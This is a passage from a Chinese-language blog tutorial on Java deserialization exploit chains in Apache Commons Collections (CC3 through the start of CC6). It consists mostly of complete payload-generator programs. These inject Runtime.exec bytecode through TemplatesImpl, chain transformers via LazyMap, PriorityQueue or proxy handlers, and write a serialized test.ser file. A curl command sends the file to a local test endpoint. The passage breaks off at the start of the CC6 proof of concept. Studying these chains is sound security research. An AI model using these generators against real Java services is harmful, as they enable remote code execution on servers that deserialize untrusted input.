<h4 id="动态代理-InvocationHandler-amp-AnnotationInvocationHandler"><a href="#动态代理-InvocationHandler-amp-AnnotationInvocationHandler" class="headerlink" title="动态代理 - InvocationHandler &amp; AnnotationInvocationHandler"></a>动态代理 - InvocationHandler &amp; AnnotationInvocationHandler</h4><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/">Java反序列化漏洞之静态代理与动态代理(5)</a>中已经详细讲解过，此处的<code>InvocationHandler</code>接口其实就是负责提供调用代理操作，在动态代理中，一个代理类必须要实现<code>InvocationHandler</code>类，从而每当客户调用代理类动态生成的代理instance的方法的时候，<strong>都会被转发</strong>至代理类的<code>invoke()</code>方法。我们得知<code>AnnotationInvocationHandler implements InvocationHandler</code>，是否意味着，<code>AnnotationInvocationHandler</code>就可以作为一个代理类呢？</p>
<p>如果我们用<code>AnnotationInvocationHandler</code>代理类动态生成一个代理A，再去访问代理A的方法，我们就可以自动call到代理类<code>AnnotationInvocationHandlers</code>中的<code>invoke()</code>方法了</p>
<p>如果这个代理A是一个HashMap，那么我们只要执行了这个创建的代理HashMap的任意一个function，都能触发命令。</p>
<pre><code class="java">//创建代理类的实例
InvocationHandler InvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了
Map testMap = new HashMap();
Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);
</code></pre>
<h4 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h4><p>我们注意到<code>AnnotationInvocationHandler</code>有它自己的<code>readObject()</code>，这意味着，如果我们把它作为序列化object传给服务器，服务器在反序列化时会执行其<code>readObject()</code>方法。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201161957159.png" alt="image-20211201161957159"></p>
<p>经过分析，我们非常清楚，<code>memberValues</code>是可控的，可以通过反射构造函数来控制。如果我们将<code>memberValues</code>设置为我们上一步生成的代理<code>evilMap</code>，那么意味着，反序列化时我们就可以完成整条攻击链了！</p>
<pre><code class="java">        //创建代理类的实例
        InvocationHandler InvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        //创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了
        Map testMap = new HashMap();
        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);
        //创建第二个代理类的实例
        InvocationHandler anotherInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);
        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(anotherInvocationHandler);
        outputStream.close();
</code></pre>
<p>用web环境实验一下:<code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @test.ser</code></p>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201162910487.png" alt="image-20211201162910487"></p>
<h3 id="Payload构造-2"><a href="#Payload构造-2" class="headerlink" title="Payload构造"></a>Payload构造</h3><h4 id="方法一-InvokerTransformer"><a href="#方法一-InvokerTransformer" class="headerlink" title="方法一 InvokerTransformer"></a>方法一 InvokerTransformer</h4><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 &#123;

    public static void main(String[] args) throws Exception &#123;
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,&quot;_name&quot;,&quot;leihehe&quot;);
        setFieldValue(templates,&quot;_class&quot;,null);
        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;classBytes&#125;);
        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());


        Class trAXFilterClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;);
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(trAXFilterClass),
                new InvokerTransformer(&quot;getConstructor&quot;,new Class[]&#123;Class[].class&#125;,new Object[]&#123;new Class[]&#123;Templates.class&#125;&#125;),
                new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;,new Object[] &#123;new Object[]&#123;templates&#125;&#125;)
        &#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);

        String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
        final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        //创建代理类的实例
        InvocationHandler InvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        //创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了
        Map testMap = new HashMap();
        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);
        //创建第二个代理类的实例
        InvocationHandler anotherInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(anotherInvocationHandler);
        outputStream.close();


    &#125;

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<h4 id="方法二-InstantiateTransformer"><a href="#方法二-InstantiateTransformer" class="headerlink" title="方法二 InstantiateTransformer"></a>方法二 InstantiateTransformer</h4><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections3Method2 &#123;

    public static void main(String[] args) throws Exception &#123;
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,&quot;_name&quot;,&quot;leihehe&quot;);
        setFieldValue(templates,&quot;_class&quot;,null);
        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;classBytes&#125;);
        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());


        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);


        String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
        final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        //创建代理类的实例
        InvocationHandler InvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        //创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了
        Map testMap = new HashMap();
        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);
        //创建第二个代理类的实例
        InvocationHandler anotherInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);


        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(anotherInvocationHandler);
        outputStream.close();
    &#125;

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综合了cc1和cc2，利用了之前学过的动态代理。</p>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230788">Ysoserial CommonsCollections1 详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233393">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections4:4.0</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>在<code>commons-collections4:4.0</code>中，<code>InvokerTransfomer()</code>不能再用了，所以我们用到了</p>
<ul>
<li>cc2的前部分: PriorityQueue -&gt; TransformingComparator</li>
<li>cc3的后部分：InstanitateTransformer-&gt;TrAXFilter -&gt; TemplatesImpl</li>
</ul>
<h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 &#123;
    public static void main(String[] args) throws Exception &#123;
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,&quot;_name&quot;,&quot;leihehe&quot;);
        setFieldValue(templates,&quot;_class&quot;,null);
        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;classBytes&#125;);
        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());

        ConstantTransformer constantTransformer = new ConstantTransformer(String.class);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;haha&quot;&#125;);
        Transformer[] transformers = new Transformer[]&#123;
                constantTransformer,
                instantiateTransformer
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        /* 创建TransformingComparator */
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);

        /* 创建PriorityQueue */
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,comparator);
        //priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform
        queue.add(1);//add elements
        queue.add(1);
        setFieldValue(constantTransformer,&quot;iConstant&quot;,TrAXFilter.class);//需要在最后一步修改，否则出错

        setFieldValue(instantiateTransformer,&quot;iParamTypes&quot;,new Class[]&#123;Templates.class&#125;);
        setFieldValue(instantiateTransformer,&quot;iArgs&quot;,new Object[]&#123;templates&#125;);

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(queue);
        outputStream.close();

    &#125;
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<p>我们知道<code>PriorityQueue</code>在使用<code>add()</code>方法的时候，会执行其<code>comparator</code>，导致利用链会在序列化前就被触发而程序终止。所以我们需要在add之后再把我们利用链用到的东西放进去。例如<code>constantTransformer</code>和<code>InstantiateTransformer</code>都是如此，我们在add之后才对他们的参数进行修改。</p>
<p>因为我们只需要call到<code>chainedTransformer.transform()</code>方法，不需要像cc2链一样要向<code>InvokerTransformer</code>传数据，因此我们不需要在<code>queue</code>中添加构造的<code>templates</code>了。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4Method2 &#123;
    public static void main(String[] args) throws Exception &#123;
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,&quot;_name&quot;,&quot;leihehe&quot;);
        setFieldValue(templates,&quot;_class&quot;,null);
        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;classBytes&#125;);
        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        /* 创建TransformingComparator */
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);

        /* 创建PriorityQueue */
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
        //priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform
        queue.add(1);//add elements
        queue.add(1);

        setFieldValue(queue,&quot;comparator&quot;,comparator);

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(queue);
        outputStream.close();

    &#125;
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<p>该方法的区别在于，我们不需要先伪装<code>transformers</code>里的各种<code>transformer</code>，相反，我们先创建一个不含自定义<code>comparator</code>的PriorityQueue，在add完之后，我们再将<code>comparator</code>加进这个<code>PriorityQueue</code>，这样就巧妙的绕过了<code>add()</code>触发点</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>cc4 = cc2和cc3的混合体</p>
<blockquote>
<p>Gadget chain:<br> ObjectInputStream.readObject()<br>     PriorityQueue.readObject()<br>       TransformingComparator()<br>         ChainedTransformer.transform()<br>             ConstantTransformer.transform()<br>                 InstantiateTransformer.transform()<br>                     TrAXFilter.TrAXFilter()<br>                         …<br>                             exec()</p>
</blockquote>
<h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233393#h3-8">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.8</li>
</ul>
<h3 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><a href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer" class="headerlink" title="ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer"></a>ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</h4><p>在cc5后半部分，我们依然使用之前用过的利用链</p>
<blockquote>
<p>ChainedTransformer.transform()</p>
<p>​    ConstantTransformer.transform()</p>
<p>​        InvokerTransformer.transform()</p>
<p>​            Runtime.exec()</p>
</blockquote>
<p>在<code>commons-collections:3.1-3.2.1</code>中，我们的<code>InvokerTransformer</code>存在，所以可以继续利用它来作为我们利用链的一部分。</p>
<h4 id="LazyMap-1"><a href="#LazyMap-1" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>和cc1一样，我们选择使用**LazyMap.get()**来触发<code>ChainedTransformer.transform()</code></p>
<pre><code class="java">    public Object get(Object key) &#123;
        if (!super.map.containsKey(key)) &#123;
            Object value = this.factory.transform(key);//此处会执行factory，我们将factory赋值为我们的chainedTrasnformer即可
            super.map.put(key, value);
            return value;
        &#125; else &#123;
            return super.map.get(key);
        &#125;
    &#125;
</code></pre>
<p><code>LazyMap</code>的构造函数是<code>protected</code>的，我们可以用<code>LazyMap.decorate()</code>来得到我们想要的<code>LazyMap instance</code>，具体的在之前的cc1和cc3都有讲解过。</p>
<pre><code class="java">    public static Map decorate(Map map, Transformer factory) &#123;
        return new LazyMap(map, factory);
    &#125;
</code></pre>
<p>现在我们可以暂时写出如下payload：</p>
<pre><code class="java">public class CommonsCollections5 &#123;
    public static void main(String[] args) &#123;

        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
    &#125;
&#125;
</code></pre>
<p>在cc1中，我们有用到<code>AnnotationInvocationHandler</code>，但<code>AnnotationInvocationHandler</code>在JDK1.8做了限制，所以我们用到了<code>BadAttributeValueExpException</code></p>
<hr>
<p>写着一半发现不对劲，之前其实有写了cc5，写在cc1的地方重复了 LOL</p>
<p>剩下看<a href="#cc5">这里</a></p>
<hr>
<h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7&amp;1.8</li>
</ul>
<h3 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>在cc5中，我们使用<code>TiedMapEntry.toString()</code>来执行<code>TiedMap.getValue()</code>，再由<code>BadAttributeInvocationHandler</code>来执行<code>TiedMapEntry.toString()</code>，从而完成利用链的衔接。我们在cc6中，将另外寻找一条链，能够连接<code>TiedMapEntry.getValue()-&gt;Lazymap.get() -&gt; ChainedTransformer.transform()</code></p>
<h4 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a>TiedMapEntry.hashCode()</h4><p>我们发现，在<strong>hashCode()<strong>方法中也call到了</strong>getValue()</strong></p>
<pre><code class="java">    public int hashCode() &#123;
        Object value = this.getValue();//这里也call到了同类下的getValue()
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    &#125;
</code></pre>
<p>那么什么能够执行<code>hashCode()</code>呢</p>
<h4 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h4><p>我们在<code>HashMap</code>下找到了<code>hash()</code>方法，其中call到了<code>hashCode()</code></p>
<pre><code class="java">    final int hash(Object k) &#123;
        int h = hashSeed;
        if (0 != h &amp;&amp; k instanceof String) &#123;
            return sun.misc.Hashing.stringHash32((String) k);
        &#125;

        h ^= k.hashCode();//这里我们如果给k赋值为TiedMapEntry的instance就可以执行命令

        // This function ensures that hashCodes that differ only by
        // constant multiples at each bit position have a bounded
        // number of collisions (approximately 8 at default load factor).
        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
    &#125;
</code></pre>
<p>继续找可以连接<code>hash()</code>的方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145232237.png" alt="image-20211204145232237"></p>
<p>我们发现这里有很多地方都用到了<code>hash()</code>，我们一个一个分析</p>
<h4 id="调用hash-处一（方法一）："><a href="#调用hash-处一（方法一）：" class="headerlink" title="调用hash()处一（方法一）："></a>调用hash()处一（方法一）：</h4><h5 id="HashMap-putForCreate-amp-HashMap-readObject"><a href="#HashMap-putForCreate-amp-HashMap-readObject" class="headerlink" title="HashMap.putForCreate() &amp; HashMap.readObject()"></a>HashMap.putForCreate() &amp; HashMap.readObject()</h5><p>最后我们找到putForCreate()，发现它调用了<code>hash()</code>且它<strong>会被readObject()调用</strong></p>
<pre><code class="java">    private void putForCreate(K key, V value) &#123;
        int hash = null == key ? 0 : hash(key);//如果key不为null,这里会调用hash(key)
        int i = indexFor(hash, table.length);

        /**
         * Look for preexisting entry for key.  This will never happen for
         * clone or deserialize.  It will only happen for construction if the
         * input Map is a sorted map whose ordering is inconsistent w/ equals.
         */
        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;
            Object k;
            if (e.hash == hash &amp;&amp;
                ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) &#123;
                e.value = value;
                return;
            &#125;
        &#125;

        createEntry(hash, key, value, i);
    &#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145642205.png" alt="image-20211204145642205"></p>
<p>那么我们就可以确定使用这个链了</p>
<blockquote>
<p>HashMap.readObject([key,value])-&gt;HashMap.putForCreate(key,value)-&gt;HashMap.hash(key)-&gt;key.hashcode()-&gt;TiedMapEntrykey.hashCode()-&gt;TiedMapEntry.getValue(this.key=chainedTransformer)-&gt;Lazymap.get(chainedTransformer) -&gt; ChainedTransformer.transform() -&gt; …..</p>
</blockquote>
<p>我们尝试来构造一下<strong>POC</strong>:</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
